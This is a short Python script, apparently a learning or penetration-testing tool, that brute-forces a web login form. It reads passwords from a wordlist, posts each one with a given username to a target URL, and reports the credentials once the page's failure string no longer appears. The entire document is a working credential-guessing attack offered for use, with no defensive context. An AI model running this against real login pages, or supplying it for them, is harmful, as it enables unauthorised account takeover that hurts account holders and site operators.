import requests
from termcolor import colored

url = input('[+] Enter Page URL :')

username = input('[+] Enter the username :')

passwordFile = input('[+] Enter the password file to use :')

loginFailed = input('[+] Enter the string when login fails :')

def crackings(username, url):
    for password in passwords:
        password = password.strip()
        print(colored(('Trying :' + password), 'red'))
        data = {'username':username, 'password':password, 'Login':'submit'}
        response = requests.post(url, data=data)
        if loginFailed in response.content.decode():
            pass
        else:
            print(colored(('[+] Found Username : ' + username), 'green'))
            print(colored(('[+] Found Password : ' + password), 'green'))
            exit()

with open(passwordFile,'r') as passwords:
    crackings(username, url)

print('[!!]password Not in the list')
